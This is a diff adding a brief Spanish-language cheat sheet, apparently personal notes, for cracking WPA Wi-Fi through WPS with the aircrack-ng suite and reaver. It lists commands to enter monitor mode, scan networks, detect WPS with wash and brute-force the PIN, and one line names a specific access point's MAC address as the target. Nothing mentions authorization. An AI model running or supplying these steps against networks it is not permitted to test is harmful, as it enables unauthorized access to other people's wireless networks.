@@ -1,0 +1,23 @@
+reaver - con wpa
+
+Conoce tus interfaces
+
+	airmon-ng
+
+Selecciona, entras al modo monitor
+
+	airmon-ng start <name>
+
+Escanea tus redes
+
+	airodump-ng <interfaz>
+
+Saber si esta activo WPS
+
+	wash -i <interfaz> -b <BSSID>
+	reaver -i wlp2s0mon -b 74:A0:63:A7:39:EC
+
+
+Usa Reaver
+
+reaver -i <interfaz> -b <BSSID> -vv
